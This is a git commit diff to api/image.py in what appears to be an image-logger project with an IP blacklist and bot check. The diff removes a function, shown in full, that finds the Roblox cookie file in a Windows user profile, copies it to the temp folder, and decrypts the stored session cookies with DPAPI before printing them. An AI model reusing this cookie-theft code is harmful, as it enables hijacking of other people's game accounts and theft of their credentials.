296cde83ae3ac5d730e12c3119d6969d013f112f
YANSISOK <113627293+YANSISOK@users.noreply.github.com>
2025-08-31 22:46:06 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -65,39 +65,6 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better
-def retrieve_roblox_cookies():
-    user_profile = os.getenv("USERPROFILE", "")
-    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-    if not os.path.exists(roblox_cookies_path):
-        return
-    
-    temp_dir = os.getenv("TEMP", "")
-    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
-
-    with open(destination_path, 'r', encoding='utf-8') as file:
-        try:
-            file_content = json.load(file)
-            
-            encoded_cookies = file_content.get("CookiesData", "")
-            
-            if encoded_cookies:
-                decoded_cookies = base64.b64decode(encoded_cookies)
-                
-                try:
-                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-                    print("Decrypted Content:")
-                    print(decrypted_cookies.decode('utf-8', errors='ignore'))
-                except Exception as e:
-                    print(f"Error decrypting with DPAPI: {e}")
-            else:
-                print("Error: No 'CookiesData' found in the file.")
-        
-        except json.JSONDecodeError as e:
-            print(f"Error while parsing JSON: {e}")
-        except Exception as e:
-            print(f"Error: {e}")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
